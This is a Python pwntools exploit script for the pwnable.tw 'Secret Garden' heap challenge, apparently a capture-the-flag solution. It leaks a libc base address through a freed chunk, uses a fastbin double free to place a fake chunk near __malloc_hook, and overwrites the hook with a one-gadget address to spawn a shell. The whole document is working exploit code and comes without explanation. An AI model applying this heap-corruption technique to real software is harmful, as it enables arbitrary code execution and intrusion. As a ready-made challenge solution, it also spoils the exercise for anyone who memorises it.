from pwn import *

context.log_level = "debug"
debug = 1
elf = ELF("./secretgarden")
libc = ELF("libc_64.so.6")
main_arena_offset = 0x3c3b20

if debug:
    p = process(['./secretgarden'], env={"LD_PRELOAD":"./libc_64.so.6"})
    gdb.attach(p)
else:
    p = remote("chall.pwnable.tw", 10203)


def raiseFlower(length, name, color):
    p.recvuntil("choice : ")
    p.sendline("1")
    p.recvuntil("name :")
    p.sendline(str(length))
    p.recvuntil("flower :")
    p.sendline(name)
    p.recvuntil("flower :")
    p.sendline(color)


def visit():
    p.recvuntil("choice : ")
    p.sendline("2")


def remove(index):
    p.recvuntil("choice : ")
    p.sendline("3")
    p.recvuntil("garden:")
    p.sendline(str(index))


def clean():
    p.recvuntil("choice : ")
    p.sendline("4")


def leave():
    p.recvuntil("choice : ")
    p.sendline("5")


# leak address
one_gadegt = 0x45216
raiseFlower(400, "test", "test")
raiseFlower(400, "test", "test")
raiseFlower(40, "test", "test")
remove(1)
remove(2)
raiseFlower(400, "1" * 0x7, "test")
visit()
p.recvuntil("flower[3]")
p.recvuntil("\n")
libc.address = u64(p.recv(6).ljust(8, "\x00")) - 88 - main_arena_offset
malloc_hook_address = libc.symbols['__malloc_hook']
one_gadegt_address = libc.address + one_gadegt

# overwrote fd pointer
raiseFlower(0x60, "test", "test")  # 4
raiseFlower(0x60, "test", "test")

remove(4)
remove(5)
remove(4)
print "libc address", hex(libc.address)
print "malloc hook address", hex(malloc_hook_address)
print "one gadget address", hex(one_gadegt_address)

raiseFlower(0x60, p64(malloc_hook_address-0x23), "test")
raiseFlower(0x60, "test", "test")
raiseFlower(0x60, "test", "test")
raiseFlower(0x60, "a"*0x13+p64(one_gadegt_address), "test")

remove(5)
remove(5)
p.interactive()